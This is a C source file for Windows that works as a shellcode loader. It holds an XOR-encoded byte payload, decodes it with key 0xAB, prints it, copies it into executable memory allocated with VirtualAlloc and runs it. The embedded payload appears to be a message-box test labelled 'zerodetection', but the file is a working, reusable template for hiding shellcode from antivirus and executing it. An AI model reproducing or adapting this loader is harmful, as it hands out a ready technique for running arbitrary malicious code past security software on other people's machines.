//x86_64-w64-mingw32-gcc xor_execute_encrypted_shellcode.c -o xor_exec.exe



#include <stdio.h>
#include <windows.h>



// XOR-ENC FUNCTION
void xor_encrypt(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}




int main() {

unsigned char buf[] = 
"\x57\xE3\x2A\x4F\x5B\x54\x54\x54\x43\x7B\xAB\xAB\xAB\xEA\xFA\xEA\xFB\xF9\xFA\xFD\xE3\x9A\x79\xCE\xE3\x20\xF9\xCB\x95\xE3\x20\xF9\xB3\x95\xE3\x20\xF9\x8B\x95\xE3\x20\xD9\xFB\x95\xE3\xA4\x1C\xE1\xE1\xE6\x9A\x62\xE3\x9A\x6B\x07\x97\xCA\xD7\xA9\x87\x8B\xEA\x6A\x62\xA6\xEA\xAA\x6A\x49\x46\xF9\xEA\xFA\x95\xE3\x20\xF9\x8B\x95\x20\xE9\x97\xE3\xAA\x7B\x95\x20\x2B\x23\xAB\xAB\xAB\xE3\x2E\x6B\xDF\xC4\xE3\xAA\x7B\xFB\x95\x20\xE3\xB3\x95\xEF\x20\xEB\x8B\xE2\xAA\x7B\x48\xF7\xE3\x54\x62\x95\xEA\x20\x9F\x23\xE3\xAA\x7D\xE6\x9A\x62\xE3\x9A\x6B\x07\xEA\x6A\x62\xA6\xEA\xAA\x6A\x93\x4B\xDE\x5A\x95\xE7\xA8\xE7\x8F\xA3\xEE\x92\x7A\xDE\x7D\xF3\x95\xEF\x20\xEB\x8F\xE2\xAA\x7B\xCD\x95\xEA\x20\xA7\xE3\x95\xEF\x20\xEB\xB7\xE2\xAA\x7B\x95\xEA\x20\xAF\x23\xE3\xAA\x7B\xEA\xF3\xEA\xF3\xF5\xF2\xF1\xEA\xF3\xEA\xF2\xEA\xF1\xE3\x28\x47\x8B\xEA\xF9\x54\x4B\xF3\xEA\xF2\xF1\x95\xE3\x20\xB9\x42\xE2\x54\x54\x54\xF6\x95\xE3\x26\x26\x81\xAA\xAB\xAB\xEA\x11\xE7\xDC\x8D\xAC\x54\x7E\xE2\x6C\x6A\xAB\xAB\xAB\xAB\x95\xE3\x26\x3E\xA5\xAA\xAB\xAB\x95\xE7\x26\x2E\xB7\xAA\xAB\xAB\xE3\x9A\x62\xEA\x11\xEE\x28\xFD\xAC\x54\x7E\xE3\x9A\x62\xEA\x11\x5B\x1E\x09\xFD\x54\x7E\xD1\xCE\xD9\xC4\xCF\xCE\xDF\xCE\xC8\xDF\xC2\xC4\xC5\xAB\xD1\xCE\xD9\xC4\xCF\xCE\xDF\xCE\xC8\xDF\xC2\xC4\xC5\xAB\xDE\xD8\xCE\xD9\x98\x99\x85\xCF\xC7\xC7\xAB";



    size_t len = sizeof(buf) / sizeof(buf[0]);

    
    // XOR KEY 
    unsigned char key = 0xAB;
    
    
    // XOR DECRYPTION 
    xor_encrypt(buf, len, key);
    
    // SHOW DECRYPTED SHELLCODE 
    printf("EntschlÃ¼sselter Inhalt: ");
    for (size_t i = 0; i < len; i++) {
        printf("%02X ", buf[i]);
    }
    printf("\n");


    // EXECUTE SHELLCODE
    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof buf);
    ((void(*)())exec)();
    
    return 0;
}
